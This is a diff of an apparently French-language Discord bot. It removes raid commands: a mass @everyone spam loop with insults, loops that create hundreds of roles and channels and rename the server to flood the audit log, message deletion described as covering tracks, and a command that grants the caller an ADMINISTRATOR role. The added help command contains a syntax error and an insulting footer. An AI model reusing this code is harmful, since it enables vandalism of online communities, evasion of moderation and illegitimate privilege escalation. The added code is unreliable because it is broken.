@@ -101,19 +101,6 @@ client.on('message', message => {
 
 
 
-
-           // Help
-client.on('message', message => {
-  var args = message.content.split(" ").slice(1)
-  if(message.content.startsWith(prefix + ("help"))) {
-    let ballembed = new Discord.RichEmbed()
-    .setTitle("EF ALL")
-    .setDescription("ONT VAS BZ DES MERES BANDES DE SALOPES.")
-    .setColor("#c10f0f")
-    .addField("EZZZZZZ", "h!spam : spam mdr\nh!channel: cree mass channel et change le nom.\nh!icon:change licon\nh!ef: met admin.")
-    message.channel.send(ballembed);
-  }
-});
             
             
         // Commande pour Poster son Avatar.
@@ -124,53 +111,10 @@ client.on('message', message => {
           })
 
 
-//Commande de Flood
-client.on("message", message => {
-  if(cmd("spam", message)) {
 
-  message.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
-  for (var i = 0; i < 100000; i++) {
-      message.channel.send("@everyone EF EZ ALL\nLA EF TA BZ TA GROSSE MERE LA RENE DES PUTEES\nhttps://cdn.discordapp.com/attachments/436519975876820994/442973995235540992/rainbowfrog.gif");
-  }
-}
-});
-          // Commande de Destruction
-client.on("message", msg => {
-if(cmd("channel", msg)) {
-  msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
-  for (var i = 0; i < 500; i++) {
-      // Creates new roles to clog up the audit log
-      msg.guild.createRole({
-          name: 'LA EF TA NIKER PD',
-          color: 'BLUE',
-      });
-      msg.guild.createChannel('LA EF A BZ TA MERE PD', 'voice')
-      msg.guild.createChannel('LA EF A BZ TA MERE PD', 'text')
-      //changes name tons of times to clog up the audit log
-      msg.guild.setName("EF: ELFAMOSO > EZ ALL");
-      msg.guild.setRegion('russia')
-   }
-   
-   
-}
-});       
 
-       // Commande de Destruction
-client.on("message", msg => {
-if(cmd("icon", msg)) {
-  msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
-  for (var i = 0; i < 500; i++) {
-      // Creates new roles to clog up the audit log
-      msg.guild.createRole({
-          name: 'ELFAMOSO',
-          color: 'RED',
-      });
-      msg.guild.setIcon('https://image.noelshack.com/fichiers/2018/20/5/1526669496-telechargement-1.png')
-   }
-   
-   
-}
-});       
+
+
 
 
 
@@ -197,25 +141,16 @@ if(cmd("icon", msg)) {
                 
               }
             });
-            
-
+			
+			if message.content === prefix + "hhelp"){
+				var embed = new Discord.RichEmbed()
+					.setTitle("AIDE")
+					.setDescription("Liste des commandes disponibles")
+					.addField(".help","page d'aide",true)
+					.addField("Test","test 1 1 1 1 1:D c un test [lien du modera ahbibi](https://moderabot.jimdosite.com/)", true)
+				.setColor("0x0000ff")
+				.setFooter("je bz ta mere pd")
+				message.channel.sendEmbed(embed);
+			}
+			 });
       
-            // Commande d'Admin
-            client.on('message', message => {
-              if(message.content.startsWith(prefix + ("ef"))) {
-                let RoleToAdd = message.guild.roles.find('name', 'ELFAMOSO')
- 
-                message.member.addRole(RoleToAdd);
-                 message.guild.createRole({
- 
-                  name: 'ELFAMOSO',
-                 
-                  color: 'RED',
-                 
-                  permissions:'ADMINISTRATOR',            
-                
-                })
-                 
-                }
-                 
-                });
